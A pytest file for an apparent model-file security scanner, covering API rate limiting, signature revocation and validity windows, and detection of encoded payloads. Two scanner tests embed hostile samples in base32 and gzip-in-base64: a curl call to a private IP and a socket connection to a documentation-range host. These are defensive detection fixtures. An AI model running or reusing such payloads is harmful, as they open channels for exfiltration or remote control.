"""Tests for the completion batch: rate limiting, signature lifecycle
(revocation + validity window), and extra exfil encodings (base32 / gzip)."""

import base64
import gzip
import pickle
from datetime import datetime, timezone

import pytest
from fastapi.testclient import TestClient

from purser.scanners.exfil import ExfilScanner

pytest.importorskip("cryptography")

from purser.core.signing import (  # noqa: E402
    generate_keypair,
    verify_target,
    write_signature,
)


# -- per-client rate limiting ------------------------------------------------

@pytest.fixture
def client(monkeypatch, tmp_path):
    monkeypatch.delenv("PURSER_POLICY", raising=False)
    monkeypatch.setenv("PURSER_SCAN_ROOT", str(tmp_path))
    import purser.api as api
    api._buckets.clear()
    return TestClient(api.app)


def test_rate_limit_allows_under_limit(client, monkeypatch):
    monkeypatch.setenv("PURSER_RATE_LIMIT_RPM", "60")
    assert client.get("/v1/policy").status_code == 200


def test_rate_limit_blocks_over_burst(client, monkeypatch):
    monkeypatch.setenv("PURSER_RATE_LIMIT_RPM", "3")  # burst capacity 3
    codes = [client.get("/v1/policy").status_code for _ in range(6)]
    assert codes.count(200) <= 3
    assert 429 in codes
    # 429 carries a Retry-After header
    over = client.get("/v1/policy")
    if over.status_code == 429:
        assert "retry-after" in {k.lower() for k in over.headers}


def test_rate_limit_disabled_by_default(client):
    codes = [client.get("/v1/policy").status_code for _ in range(20)]
    assert all(c == 200 for c in codes)


def test_rate_limit_healthz_exempt(client, monkeypatch):
    monkeypatch.setenv("PURSER_RATE_LIMIT_RPM", "1")
    assert all(client.get("/healthz").status_code == 200 for _ in range(10))


# -- signature lifecycle: revocation & validity window -----------------------

@pytest.fixture
def signed(tmp_path):
    priv, pub = generate_keypair()
    p = tmp_path / "model.pkl"
    p.write_bytes(pickle.dumps({"w": [1.0]}))
    write_signature(p, priv, "k1", created="2026-06-01T00:00:00+00:00")
    return p, pub


def _store(pub, **extra):
    entry = {"publisher": "acme", "origin": "US", "public_key": pub.decode()}
    entry.update({k: str(v) for k, v in extra.items()})
    return {"k1": entry}


def test_valid_signature_still_verifies(signed):
    p, pub = signed
    assert verify_target(p, _store(pub)).status == "verified"


def test_revoked_key_rejected(signed):
    p, pub = signed
    r = verify_target(p, _store(pub, revoked="True"))
    assert r.status == "revoked"


def test_signature_before_validity_window(signed):
    p, pub = signed  # signed 2026-06-01
    r = verify_target(p, _store(pub, not_before="2026-07-01"))
    assert r.status == "expired"


def test_signature_after_validity_window(signed):
    p, pub = signed
    r = verify_target(p, _store(pub, not_after="2026-05-01"))
    assert r.status == "expired"


def test_signature_within_window_ok(signed):
    p, pub = signed
    r = verify_target(p, _store(pub, not_before="2026-01-01", not_after="2026-12-31"))
    assert r.status == "verified"


# -- extra exfil encodings ---------------------------------------------------

def rules(findings):
    return {f.rule_id for f in findings}


def test_base32_payload_detected():
    script = b"import os\nos.system('curl http://10.0.0.1/x')\n" + b"#" * 20
    blob = base64.b32encode(script)
    data = b"\x00" * 8 + blob + b"\x00" * 8
    findings = [f for f in ExfilScanner().scan_bytes(data)
                if f.rule_id == "EXFIL_ENCODED_PAYLOAD"]
    assert findings


def test_gzip_inside_base64_detected():
    script = b"import socket\ns=socket.socket()\ns.connect(('203.0.113.1',9000))\n"
    blob = base64.b64encode(gzip.compress(script))
    data = b"\x00" * 8 + blob + b"\x00" * 8
    findings = [f for f in ExfilScanner().scan_bytes(data)
                if f.rule_id == "EXFIL_ENCODED_PAYLOAD" and "decompress" in f.evidence.get("reason", "")]
    assert findings


def test_gzip_benign_not_flagged():
    # random-ish binary gzip'd then base64'd -> decompresses to binary, ignored
    import os as _os
    blob = base64.b64encode(gzip.compress(_os.urandom(2048)))
    data = b"\x00" * 8 + blob + b"\x00" * 8
    findings = [f for f in ExfilScanner().scan_bytes(data)
                if f.rule_id == "EXFIL_ENCODED_PAYLOAD"]
    assert not findings


def test_signature_created_stamped_by_cli(tmp_path):
    # write_signature records the created timestamp we pass through
    priv, _ = generate_keypair()
    p = tmp_path / "m.pkl"
    p.write_bytes(pickle.dumps({"w": [1]}))
    now = datetime.now(timezone.utc).isoformat(timespec="seconds")
    write_signature(p, priv, "k1", created=now)
    from purser.core.signing import load_signature
    assert load_signature(p).created == now
